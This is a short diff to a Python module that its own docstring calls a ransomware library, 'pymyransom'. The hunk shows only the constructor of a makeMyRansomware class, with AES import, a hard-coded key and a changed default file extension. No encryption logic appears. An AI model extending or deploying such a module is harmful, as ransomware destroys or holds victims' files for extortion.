@@ -4,7 +4,7 @@ import getpass
 from Cryptodome.Cipher import AES
 
 class makeMyRansomware:
-    def __init__(self, your_extension="Example", key=b'keyfor16bytes123', username=getpass.getuser(), passFile=None):
+    def __init__(self, your_extension=".Example", key=b'keyfor16bytes123', username=getpass.getuser(), passFile=None):
         '''Usage : ransomware_name = makeMyRansomware(".YourExtension")
         Thank you for using pymyransom!
         This ransomware module encrypts or decrypts files with AES.
